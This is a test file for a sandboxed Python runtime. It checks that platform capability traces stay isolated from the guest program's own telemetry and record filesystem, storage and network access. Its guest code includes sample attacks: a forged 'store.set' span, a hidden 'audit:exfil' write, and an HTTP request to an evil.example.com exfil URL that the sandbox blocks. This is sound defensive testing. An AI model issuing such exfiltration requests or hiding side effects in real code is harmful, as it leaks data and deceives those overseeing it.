defmodule Pyex.TelemetryIsolationTest do
  @moduledoc """
  Proves the wall between the two telemetry channels, and why it matters for an
  agent that test-drives its own code.

    * **Platform trace** (`Pyex.Ctx.spans/1` over `otel_*`, exported by
      `Pyex.Turn`): pyex's own capability spans — a *tamper-proof* record of
      what the code actually touched.
    * **Tenant trace** (`app_span_*`, the guest `opentelemetry` module): the
      sandboxed program's own instrumentation.

  The platform channel is the ground truth an agent reviews to verify behaviour.
  For that to be trustworthy, sandboxed code must not be able to write into,
  read, or impersonate it. These tests pin exactly that — adversarially — and
  then show the payoff: the platform trace catches an effect the program's own
  instrumentation hides.
  """

  use ExUnit.Case, async: true

  alias Pyex.{Ctx, Storage}

  defp run(src, opts \\ []) do
    {:ok, _v, ctx} = Pyex.run(src, opts)
    ctx
  end

  defp platform_span_names(ctx), do: ctx |> Ctx.runtime_spans() |> Enum.map(& &1.name)
  defp tenant_span_names(ctx), do: ctx.app_spans |> Enum.map(& &1.name)
  defp platform_spans(ctx), do: Ctx.runtime_spans(ctx)

  describe "the wall: the two channels never share storage" do
    test "a guest's opentelemetry spans never enter the platform trace" do
      ctx =
        run("""
        from opentelemetry import trace
        tracer = trace.get_tracer("app")
        with tracer.start_as_current_span("handle") as span:
            span.set_attribute("route", "/x")
        """)

      # Guest instrumented one span; the platform trace stays empty, and its
      # counter never moved.
      assert "handle" in tenant_span_names(ctx)
      assert platform_span_names(ctx) == []
      assert ctx.runtime_span_seq == 0
    end

    test "capability spans never enter the guest's trace and the guest can't read them" do
      ctx =
        run(
          """
          import store, opentelemetry
          store.set("k", 1)
          store.get("k")
          # The guest asks for *its* finished spans — capability spans are invisible.
          print([s["name"] for s in opentelemetry.get_finished_spans()])
          """,
          storage: Storage.Memory.new()
        )

      assert "store.set" in platform_span_names(ctx)
      assert "store.get" in platform_span_names(ctx)
      assert tenant_span_names(ctx) == []
      # The guest's view of its own spans contains no capability span.
      assert Pyex.output(ctx) |> String.trim() == "[]"
    end

    test "the platform counter is untouched by guest spans and vice versa" do
      tenant_only =
        run("""
        from opentelemetry import trace
        with trace.get_tracer("a").start_as_current_span("s"):
            pass
        """)

      platform_only = run("import store\nstore.set('k', 1)", storage: Storage.Memory.new())

      assert tenant_only.runtime_span_seq == 0
      assert platform_only.app_span_seq == 0
    end
  end

  describe "adversarial: a guest cannot forge into the platform trace" do
    test "a tenant span named exactly like a capability span stays in the tenant channel" do
      ctx =
        run(
          """
          from opentelemetry import trace
          import store
          store.set("real", 1)
          # Impersonation attempt: forge a span with the capability's own name.
          with trace.get_tracer("evil").start_as_current_span("store.set") as s:
              s.set_attribute("key", "victim")
          """,
          storage: Storage.Memory.new()
        )

      # The platform trace holds exactly one store.set — the real one. The forged
      # span is confined to the tenant channel and cannot inflate or pollute it.
      assert Enum.count(platform_span_names(ctx), &(&1 == "store.set")) == 1
      real = ctx |> Ctx.runtime_spans() |> Enum.find(&(&1.name == "store.set"))
      assert real.attributes["key"] == "real"
      assert "store.set" in tenant_span_names(ctx)
    end
  end

  describe "the payoff: the platform trace is ground truth an agent can trust" do
    test "it reveals a write the program's own instrumentation omits" do
      # A program that self-reports only a read, but quietly also writes. An
      # agent trusting the guest's instrumentation would miss the write; the
      # platform trace does not.
      ctx =
        run(
          """
          from opentelemetry import trace
          import store
          tracer = trace.get_tracer("sneaky")
          with tracer.start_as_current_span("read_profile"):
              store.get("profile")
              store.set("audit:exfil", "secret")   # undisclosed side effect
          """,
          storage: Storage.Memory.new()
        )

      # The guest's self-report claims a single read.
      assert tenant_span_names(ctx) == ["read_profile"]

      # The platform trace exposes the write the program never disclosed —
      # this is what an agent reviews instead of trusting self-instrumentation.
      assert "store.set" in platform_span_names(ctx)
      write = ctx |> Ctx.runtime_spans() |> Enum.find(&(&1.name == "store.set"))
      assert write.attributes["key"] == "audit:exfil"
    end
  end

  describe "the platform trace covers the filesystem, not just storage" do
    test "file access is recorded with its path and read/write intent" do
      ctx =
        run(
          """
          with open("/data/users.csv", "w") as f:
              f.write("id,name\\n1,ivar\\n")
          with open("/data/users.csv") as f:
              f.read()
          """,
          filesystem: Pyex.FS.new(%{})
        )

      opens = platform_spans(ctx) |> Enum.filter(&(&1.name == "fs.open"))
      assert Enum.map(opens, & &1.attributes["mode"]) == ["write", "read"]
      assert Enum.all?(opens, &(&1.attributes["path"] == "/data/users.csv"))
    end

    test "a read-only handler is provable from the trace: every fs.open is mode=read" do
      ctx =
        run(
          """
          with open("/data/a.txt") as f:
              f.read()
          with open("/data/b.txt") as f:
              f.read()
          """,
          filesystem: Pyex.FS.new(%{"/data/a.txt" => "a", "/data/b.txt" => "b"})
        )

      modes =
        platform_spans(ctx)
        |> Enum.filter(&(&1.name == "fs.open"))
        |> Enum.map(& &1.attributes["mode"])

      # No write/append intent appears anywhere — the handler cannot have mutated
      # the filesystem, proven by the capability trace rather than by trust.
      assert modes == ["read", "read"]
      refute "write" in modes
      refute "append" in modes
    end
  end

  describe "the platform trace covers the network" do
    test "a blocked request is recorded with its URL — a tamper-proof exfil signal" do
      ctx =
        run("""
        import requests
        try:
            requests.get("https://evil.example.com/exfil?data=secret")
        except Exception:
            pass
        """)

      http = platform_spans(ctx) |> Enum.find(&(&1.name == "http.request"))

      # The attempt is in the ground-truth trace even though it was denied —
      # an agent reviewing the trace sees the code tried to reach out, and where.
      assert http.attributes["denied"] == true
      assert http.attributes["method"] == "GET"
      assert http.attributes["url"] == "https://evil.example.com/exfil?data=secret"
    end
  end
end
